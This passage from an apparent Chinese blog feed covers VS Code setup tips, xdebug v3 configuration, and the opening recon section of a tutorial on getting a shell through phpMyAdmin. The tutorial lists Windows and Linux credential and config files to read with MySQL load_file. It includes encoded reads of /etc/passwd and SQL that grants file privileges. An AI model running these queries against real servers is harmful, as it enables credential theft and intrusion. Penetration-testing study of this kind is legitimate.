title="22、自带终端"></a>22、自带终端</h3><p>我们可以按下「Ctrl + `」打开 VS Code 自带的终端。我认为内置终端并没有那么好用，我更建议你使用第三方的终端 <strong>item2</strong>。</p><h3 id="23、markdown-语法支持"><a href="#23、markdown-语法支持" class="headerlink" title="23、markdown 语法支持"></a>23、markdown 语法支持</h3><p>VS Code 自带 markdown 语法高亮。也就是说，如果你是用 markdown 格式写文章，则完全可以用 VS Code 进行写作。</p><p>写完 md 文件之后，你可以点击右上角的按钮进行预览，如下图所示：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_1907.png"></p><p>我一般是安装「Markdown Preview Github Styling」插件，以 GitHub 风格预览 Markdown 样式。样式十分简洁美观。</p><p>你也可以在控制面板输入<code>Markdown: 打开预览</code>，直接全屏预览 markdown 文件。</p><h3 id="24、Emmet-in-VS-Code"><a href="#24、Emmet-in-VS-Code" class="headerlink" title="24、Emmet in VS Code"></a>24、Emmet in VS Code</h3><p><code>Emmet</code>可以极大的提高 html 和 css 的编写效率，它提供了一种非常简练的语法规则。</p><p>举个例子，我们在编辑器中输入缩写代码：<code>ul&gt;li*6</code> ，然后按下 Tab 键，即可得到如下代码片段：</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></code></pre></div><p>VS Code 默认支持 Emmet。更多 Emmet 语法规则，请自行查阅。</p><h3 id="25、修改字体，使用「Fira-Code」字体"><a href="#25、修改字体，使用「Fira-Code」字体" class="headerlink" title="25、修改字体，使用「Fira Code」字体"></a>25、修改字体，使用「Fira Code」字体</h3><p>这款字体很漂亮，很适合用来写代码：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200516_1633.png"></p><p>安装步骤如下：</p><p>（1）进入 <a href="https://github.com/tonsky/FiraCode">https://github.com/tonsky/FiraCode</a> 网站，下载并安装「Fira Code」字体。</p><p>（2）打开 VS Code 的「设置」，搜索<code>font</code>，修改相关配置为如下内容：</p><div class="hljs code-wrapper"><pre><code class="hljs json">&quot;editor.fontFamily&quot;: &quot;&#x27;Fira Code&#x27;,Menlo, Monaco, &#x27;Courier New&#x27;, monospace&quot;, // 设置字体显示&quot;editor.fontLigatures&quot;: false,//控制是否启用字体连字，true启用，false不启用</code></pre></div><p>上方的第二行配置，取决于个人习惯，我是直接设置为<code>&quot;editor.fontLigatures&quot;: null</code>，因为我不太习惯连字。</p><h3 id="26、代码格式化：Prettier"><a href="#26、代码格式化：Prettier" class="headerlink" title="26、代码格式化：Prettier"></a>26、代码格式化：Prettier</h3><p>我们可以使用 <code>Prettier</code>进行代码格式化，会让代码的展示更加美观。步骤如下：</p><p>（1）安装插件 <code>Prettier</code>。</p><p>（2）在项目的根路径下，新建文件<code>.prettierrc</code>，并在文件中添加如下内容：</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;printWidth&quot;</span>: <span class="hljs-number">150</span>,  <span class="hljs-attr">&quot;tabWidth&quot;</span>: <span class="hljs-number">4</span>,  <span class="hljs-attr">&quot;semi&quot;</span>: <span class="hljs-literal">true</span>,  <span class="hljs-attr">&quot;singleQuote&quot;</span>: <span class="hljs-literal">true</span>,  <span class="hljs-attr">&quot;trailingComma&quot;</span>: <span class="hljs-string">&quot;es5&quot;</span>,  <span class="hljs-attr">&quot;tslintIntegration&quot;</span>: <span class="hljs-literal">true</span>,  <span class="hljs-attr">&quot;insertSpaceBeforeFunctionParenthesis&quot;</span>: <span class="hljs-literal">false</span>&#125;</code></pre></div><p>上面的内容，是我自己的配置，你可以参考。</p><p>更多配置，可以参考官方文档：<a href="https://prettier.io/docs/en/options.html">https://prettier.io/docs/en/options.html</a></p><h3 id="27、文件传输：sftp"><a href="#27、文件传输：sftp" class="headerlink" title="27、文件传输：sftp"></a>27、文件传输：sftp</h3><p>如果你需要将本地文件通过 ftp 的形式上传到局域网的服务器，可以安装<code>sftp</code>这个插件，很好用。在公司会经常用到。</p><p>步骤如下：</p><p>（1）安装插件<code>sftp</code>。</p><p>（2）配置 <code>sftp.json</code>文件。 插件安装完成后，输入快捷键「cmd+shift+P」弹出命令面板，然后输入<code>sftp:config</code>，回车，当前工程的<code>.vscode</code>文件夹下就会自动生成一个<code>sftp.json</code>文件，我们需要在这个文件里配置的内容可以是：</p><ul><li><p><code>host</code>：服务器的 IP 地址</p></li><li><p><code>username</code>：用户名</p></li><li><p><code>privateKeyPath</code>：存放在本地的已配置好的用于登录工作站的密钥文件（也可以是 ppk 文件）</p></li><li><p><code>remotePath</code>：工作站上与本地工程同步的文件夹路径，需要和本地工程文件根目录同名，且在使用 sftp 上传文件之前，要手动在工作站上 mkdir 生成这个根目录</p></li><li><p><code>ignore</code>：指定在使用 sftp: sync to remote 的时候忽略的文件及文件夹，注意每一行后面有逗号，最后一行没有逗号</p></li></ul><p>举例如下：(注意，其中的注释需要去掉)</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;host&quot;</span>: <span class="hljs-string">&quot;192.168.xxx.xxx&quot;</span>, <span class="hljs-comment">//服务器ip</span>  <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">22</span>, <span class="hljs-comment">//端口，sftp模式是22</span>  <span class="hljs-attr">&quot;username&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-comment">//用户名</span>  <span class="hljs-attr">&quot;password&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-comment">//密码</span>  <span class="hljs-attr">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;sftp&quot;</span>, <span class="hljs-comment">//模式</span>  <span class="hljs-attr">&quot;agent&quot;</span>: <span class="hljs-literal">null</span>,  <span class="hljs-attr">&quot;privateKeyPath&quot;</span>: <span class="hljs-literal">null</span>,  <span class="hljs-attr">&quot;passphrase&quot;</span>: <span class="hljs-literal">null</span>,  <span class="hljs-attr">&quot;passive&quot;</span>: <span class="hljs-literal">false</span>,  <span class="hljs-attr">&quot;interactiveAuth&quot;</span>: <span class="hljs-literal">false</span>,  <span class="hljs-attr">&quot;remotePath&quot;</span>: <span class="hljs-string">&quot;/root/node/build/&quot;</span>, <span class="hljs-comment">//服务器上的文件地址</span>  <span class="hljs-attr">&quot;context&quot;</span>: <span class="hljs-string">&quot;./server/build&quot;</span>, <span class="hljs-comment">//本地的文件地址</span>  <span class="hljs-attr">&quot;uploadOnSave&quot;</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">//监听保存并上传</span>  <span class="hljs-attr">&quot;syncMode&quot;</span>: <span class="hljs-string">&quot;update&quot;</span>,  <span class="hljs-attr">&quot;watcher&quot;</span>: &#123;    <span class="hljs-comment">//监听外部文件</span>    <span class="hljs-attr">&quot;files&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//外部文件的绝对路径</span>    <span class="hljs-attr">&quot;autoUpload&quot;</span>: <span class="hljs-literal">false</span>,    <span class="hljs-attr">&quot;autoDelete&quot;</span>: <span class="hljs-literal">false</span>  &#125;,  <span class="hljs-attr">&quot;ignore&quot;</span>: [    <span class="hljs-comment">//忽略项</span>    <span class="hljs-string">&quot;**/.vscode/**&quot;</span>,    <span class="hljs-string">&quot;**/.git/**&quot;</span>,    <span class="hljs-string">&quot;**/.DS_Store&quot;</span>  ]&#125;</code></pre></div><p>（3）在 VS Code 的当前文件里，选择「右键 -&gt; upload」，就可以将本地的代码上传到 指定的 ftp 服务器上（也就是在上方 <code>host</code> 中配置的服务器 ip）。</p><p>我们还可以选择「右键 -&gt; Diff with Remote」，就可以将本地的代码和 ftp 服务器上的代码做对比。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://github.com/qianguyihao/Web">https://github.com/qianguyihao/Web</a></li><li><a href="https://thedarkbay797951995.wordpress.com/2020/08/15/install-vs-code-in-kali-linux/">Install Visual Studio Code (VS Code) Editor in Kali linux</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VS-Code-快捷键与常用配置&quot;&gt;&lt;a href=&quot;#VS-Code-快捷键与常用配置&quot; class=&quot;headerlink&quot; title=&quot;VS Code 快捷键与常用配置&quot;&gt;&lt;/a&gt;VS Code 快捷键与常用配置&lt;/h1&gt;&lt;p&gt;前言：本文主要内容转载于&lt;a</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="vscode" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/vscode/"/>
    
    
    <category term="vscode" scheme="https://greydr34d.github.io/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>xdebug v3.x.x配置变化</title>
    <link href="https://greydr34d.github.io/2020/12/24/xdebug-v3-x-x%E9%85%8D%E7%BD%AE%E5%8F%98%E5%8C%96/"/>
    <id>https://greydr34d.github.io/2020/12/24/xdebug-v3-x-x%E9%85%8D%E7%BD%AE%E5%8F%98%E5%8C%96/</id>
    <published>2020-12-24T02:52:42.000Z</published>
    <updated>2021-03-13T02:58:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>给新装的虚拟机安装lamp环境，安装到xdebug的时候突然怎么也断不下来，怎么回事？？？原来是xdebug新版本的配置文件写法有了变化：</p><h1 id="老版本配置"><a href="#老版本配置" class="headerlink" title="老版本配置"></a>老版本配置</h1><p>版本为2.xx的xdebug：</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so <span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_autostart</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9000</span><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<span class="hljs-attr">xdebug.idekey</span>=PHPSTORM</code></pre></div><h1 id="官网更新说明"><a href="#官网更新说明" class="headerlink" title="官网更新说明"></a>官网更新说明</h1><p>PHP Debug Adapter for Visual Studio Code 一文中对3.xx版本的xdebug配置变化进行了说明：</p><p>Enable remote debugging in your php.ini:</p><p>For XDebug v3.x.x:</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.mode</span> = debug<span class="hljs-attr">xdebug.start_with_request</span> = <span class="hljs-literal">yes</span><span class="hljs-attr">xdebug.client_port</span> = <span class="hljs-number">9000</span></code></pre></div><p>For XDebug v2.x.x:</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.remote_enable</span> = <span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_autostart</span> = <span class="hljs-number">1</span></code></pre></div><p>所以新版配置如下：</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so <span class="hljs-attr">xdebug.mode</span> = debug <span class="hljs-attr">xdebug.start_with_request</span> = <span class="hljs-literal">yes</span> <span class="hljs-attr">xdebug.client_port</span> = <span class="hljs-number">9000</span> <span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-attr">xdebug.remote_handler</span>=dbgp <span class="hljs-attr">xdebug.idekey</span>=PHPSTORM</code></pre></div><p>vscode lauch.json</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;    <span class="hljs-comment">// Use IntelliSense to learn about possible attributes.</span>    <span class="hljs-comment">// Hover to view descriptions of existing attributes.</span>    <span class="hljs-comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span>    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,    <span class="hljs-attr">&quot;configurations&quot;</span>: [        &#123;            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Listen for XDebug&quot;</span>,            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9000</span>        &#125;,        &#123;            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch currently open script&quot;</span>,            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span>,            <span class="hljs-attr">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;$&#123;fileDirname&#125;&quot;</span>,            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9000</span>        &#125;    ]&#125;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;给新装的虚拟机安装lamp环境，安装到xdebug的时候突然怎么也断不下来，怎么回事？？？原来是xdebug新版本的配置文件写法有了变化：&lt;/p&gt;
&lt;h1 id=&quot;老版本配置&quot;&gt;&lt;a href=&quot;#老版本配置&quot; class=&quot;headerlink&quot; title=&quot;老版本配置</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="xdebug" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/xdebug/"/>
    
    
    <category term="xdebug" scheme="https://greydr34d.github.io/tags/xdebug/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin 后台 getshell 及漏洞利用思路整理</title>
    <link href="https://greydr34d.github.io/2020/11/21/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/"/>
    <id>https://greydr34d.github.io/2020/11/21/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/</id>
    <published>2020-11-21T14:24:22.000Z</published>
    <updated>2021-03-17T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpmyadmin-后台-getshell-及漏洞利用思路整理"><a href="#phpmyadmin-后台-getshell-及漏洞利用思路整理" class="headerlink" title="phpmyadmin 后台 getshell 及漏洞利用思路整理"></a>phpmyadmin 后台 getshell 及漏洞利用思路整理</h1><h2 id="0x01-信息收集思路"><a href="#0x01-信息收集思路" class="headerlink" title="0x01 信息收集思路"></a>0x01 信息收集思路</h2><h3 id="1-网站绝对路径"><a href="#1-网站绝对路径" class="headerlink" title="1. 网站绝对路径"></a>1. 网站绝对路径</h3><h4 id="1-1-mysql路径"><a href="#1-1-mysql路径" class="headerlink" title="1.1 mysql路径"></a>1.1 mysql路径</h4><p>如果是类似phpstudy这样的集成工具，那么查询出mysql路径也就可以找到网站路径了。</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> version();  <span class="hljs-comment">-- 查看数据库版本</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@datadir</span>;  <span class="hljs-comment">-- 查看数据库存储路径</span><span class="hljs-keyword">show</span> VARIABLES <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%char%&#x27;</span>;  <span class="hljs-comment">-- 查看系统变量</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>; <span class="hljs-comment">-- 查看插件路径</span></code></pre></div><h4 id="1-2-phpinfo"><a href="#1-2-phpinfo" class="headerlink" title="1.2 phpinfo()"></a>1.2 phpinfo()</h4><p>可以直接显示web路径</p><h4 id="1-3-读取配置文件"><a href="#1-3-读取配置文件" class="headerlink" title="1.3 读取配置文件"></a>1.3 读取配置文件</h4><p>如果注入点有文件读取权限，可通过 load_file 尝试读取配置文件</p><p>windows 敏感文件</p><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-function">c:/<span class="hljs-title">boot.ini</span> //查看系统版本 </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">windows</span>/<span class="hljs-title">php.ini</span> //<span class="hljs-title">php</span>配置信息 </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">windows</span>/<span class="hljs-title">my.ini</span> //<span class="hljs-title">MYSQL</span>配置文件，记录管理员登陆过的<span class="hljs-title">MYSQL</span>用户名和密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">winnt</span>/<span class="hljs-title">php.ini</span> </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">winnt</span>/<span class="hljs-title">my.ini</span> </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">mysql</span>\<span class="hljs-title">data</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">user.MYD</span> //存储了<span class="hljs-title">mysql.user</span>表中的数据库连接密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">RhinoSoft.com</span>\<span class="hljs-title">Serv</span>-<span class="hljs-title">U</span>\<span class="hljs-title">ServUDaemon.ini</span> //存储了虚拟主机网站路径和密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Serv</span>-<span class="hljs-title">U</span>\<span class="hljs-title">ServUDaemon.ini</span> </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">inetsrv</span>\<span class="hljs-title">MetaBase.xml</span> 查看<span class="hljs-title">IIS</span>的虚拟主机配置 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">repair</span>\<span class="hljs-title">sam</span> //存储了<span class="hljs-title">WINDOWS</span>系统初次安装的密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\ <span class="hljs-title">Serv</span>-<span class="hljs-title">U</span>\<span class="hljs-title">ServUAdmin.exe</span> //6.0版本以前的<span class="hljs-title">serv</span>-<span class="hljs-title">u</span>管理员密码存储于此 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">RhinoSoft.com</span>\<span class="hljs-title">ServUDaemon.exe</span> </span><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Documents</span> <span class="hljs-title">and</span> <span class="hljs-title">Settings</span>\<span class="hljs-title">All</span> <span class="hljs-title">Users</span>\<span class="hljs-title">Application</span> <span class="hljs-title">Data</span>\<span class="hljs-title">Symantec</span>\<span class="hljs-title">pcAnywhere</span>\*.<span class="hljs-title">cif</span>文件 </span><span class="hljs-function">//存储了<span class="hljs-title">pcAnywhere</span>的登陆密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Apache</span> <span class="hljs-title">Group</span>\<span class="hljs-title">Apache</span>\<span class="hljs-title">conf</span>\<span class="hljs-title">httpd.conf</span> 或<span class="hljs-title">C</span>:\<span class="hljs-title">apache</span>\<span class="hljs-title">conf</span>\<span class="hljs-title">httpd.conf</span> //查看<span class="hljs-title">WINDOWS</span>系统<span class="hljs-title">apache</span>文件 </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">Resin</span>-3.0.14/<span class="hljs-title">conf</span>/<span class="hljs-title">resin.conf</span> //查看<span class="hljs-title">jsp</span>开发的网站 <span class="hljs-title">resin</span>文件配置信息. </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">Resin</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">resin.conf</span> /<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">resin</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">resin.conf</span> 查看<span class="hljs-title">linux</span>系统配置的<span class="hljs-title">JSP</span>虚拟主机 </span><span class="hljs-function"><span class="hljs-title">d</span>:\<span class="hljs-title">APACHE</span>\<span class="hljs-title">Apache2</span>\<span class="hljs-title">conf</span>\<span class="hljs-title">httpd.conf</span> </span><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">my.ini</span> </span><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">mysql</span>\<span class="hljs-title">data</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">user.MYD</span> 存在<span class="hljs-title">MYSQL</span>系统中的用户密码</span></code></pre></div><p>linux 敏感文件</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 /usr/local/apache2/conf/httpd.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 /usr/local/app/php5/lib/php.ini //PHP相关设置 /etc/sysconfig/iptables //从中得到防火墙规则策略 /etc/httpd/conf/httpd.conf // apache配置文件 /etc/rsyncd.conf //同步程序配置文件 /etc/my.cnf //mysql的配置文件 /etc/redhat-release //系统版本 /etc/issue /etc/issue.<span class="hljs-built_in">net</span> /usr/local/app/php5/lib/php.ini //PHP相关设置 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 针对<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>的RESIN配置文件查看 /usr/local/resin-pro-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 同上 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件 /usr/local/resin-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 针对<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>的RESIN配置文件查看 /usr/local/resin-pro-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 同上 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 /etc/sysconfig/iptables 查看防火墙策略 load_file(char(<span class="hljs-number">47</span>)) 可以列出FreeBSD,Sunos系统根目录 <span class="hljs-built_in">replace</span>(load_file(<span class="hljs-number">0</span>×<span class="hljs-number">2</span>F6574632F706173737764),<span class="hljs-number">0</span>×<span class="hljs-number">3</span>c,<span class="hljs-number">0</span>×<span class="hljs-number">20</span>) <span class="hljs-built_in">replace</span>(load_file(char(<span class="hljs-number">47</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">112</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">119</span>,<span class="hljs-number">100</span>)),char(<span class="hljs-number">60</span>),char(<span class="hljs-number">32</span>))</code></pre></div><p>配置文件目录可以通过字典进行爆破。</p><h4 id="1-4-利用报错信息"><a href="#1-4-利用报错信息" class="headerlink" title="1.4 利用报错信息"></a>1.4 利用报错信息</h4><p>如果网站开启了报错信息，通过报错信息很容易找到网站根路径。不仅仅是mysql报错信息。</p><h4 id="1-5-利用-Google"><a href="#1-5-利用-Google" class="headerlink" title="1.5 利用 Google"></a>1.5 利用 <code>Google</code></h4><div class="hljs code-wrapper"><pre><code class="hljs vbnet"><span class="hljs-symbol">site:</span>xxx.com warning<span class="hljs-symbol">site:</span>xxx.com “fatal <span class="hljs-keyword">error</span>”</code></pre></div><h4 id="1-6-利用测试文件"><a href="#1-6-利用测试文件" class="headerlink" title="1.6 利用测试文件"></a>1.6 利用测试文件</h4><div class="hljs code-wrapper"><pre><code class="hljs stylus">www<span class="hljs-selector-class">.xxx</span>.com/test.phpwww<span class="hljs-selector-class">.xxx</span>.com/ceshi.phpwww<span class="hljs-selector-class">.xxx</span>.com/info.phpwww<span class="hljs-selector-class">.xxx</span>.com/phpinfo.phpwww<span class="hljs-selector-class">.xxx</span>.com/php_info.phpwww<span class="hljs-selector-class">.xxx</span>.com/<span class="hljs-number">1</span>.php</code></pre></div><p>可以去寻找测试文件字典。</p><h4 id="1-7-访问一些特定的网页"><a href="#1-7-访问一些特定的网页" class="headerlink" title="1.7 访问一些特定的网页"></a>1.7 访问一些特定的网页</h4><p>下面一些网页可能会产生报错信息，从而可以得到网站根路径</p><div class="hljs code-wrapper"><pre><code class="hljs awk">phpMyAdmin<span class="hljs-regexp">/libraries/</span>selectlang.lib.phpphpMyAdmin<span class="hljs-regexp">/darkblueorange/</span>layout.inc.phpphpmyadmin<span class="hljs-regexp">/themes/</span>darkblue_orange/layout.inc.phpphpMyAdmin/index.php?lang[]=<span class="hljs-number">1</span>phpMyAdmin<span class="hljs-regexp">/darkblueorange/</span>layout.inc.php phpMyAdmin/index.php?lang[]=<span class="hljs-number">1</span><span class="hljs-regexp">/phpmyadmin/</span>libraries/lect_lang.lib.php<span class="hljs-regexp">/phpMyAdmin/</span>phpinfo.php<span class="hljs-regexp">/phpmyadmin/</span>themes<span class="hljs-regexp">/darkblue_orange/</span>layout.inc.php<span class="hljs-regexp">/phpmyadmin/</span>libraries/select_lang.lib.php<span class="hljs-regexp">/phpmyadmin/</span>libraries/mcrypt.lib.php</code></pre></div><h3 id="2-账户是否有读写权限"><a href="#2-账户是否有读写权限" class="headerlink" title="2. 账户是否有读写权限"></a>2. 账户是否有读写权限</h3><p>写入 <code>shell</code> 时遇到报错，可能是权限的原因</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.user;                <span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询所有用户权限<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span>&quot;root&quot;;        <span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询root用户权限update <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> File_priv <span class="hljs-operator">=</span><span class="hljs-string">&#x27;Y&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span>;      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>允许root用户读写文件update <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> File_priv <span class="hljs-operator">=</span><span class="hljs-string">&#x27;N&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span>;      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>禁止root用户读写文件flush privileges;                    <span class="hljs-operator">/</span><span class="hljs-operator">/</span>刷新MySQL系统权限相关表</code></pre></div><h3 id="3-路径是否具有读写权限"><a href="#3-路径是否具有读写权限" class="headerlink" title="3. 路径是否具有读写权限"></a>3. 路径是否具有读写权限</h3><h4 id="3-1-secure-file-priv-权限"><a href="#3-1-secure-file-priv-权限" class="headerlink" title="3.1 secure_file_priv 权限"></a>3.1 secure_file_priv 权限</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@secure</span>_file_priv;   <span class="hljs-comment">-- 查询secure_file_priv</span> <span class="hljs-comment">-- secure_file_priv=NULL,禁止导入导出</span> <span class="hljs-comment">-- secure_file_priv=&#x27;&#x27;,不限制导入导出，Linux下默认/tmp目录可写</span> <span class="hljs-comment">-- secure_file_priv=/path/,只能向指定目录导入导出</span></code></pre></div><blockquote><p>在 <code>my.ini</code>、<code>my.cnf</code>、<code>mysqld.cnf</code> 文件中找到 <code>secure_file_prive</code> 并将其值设置为 “”或”/“，重启 MySQL 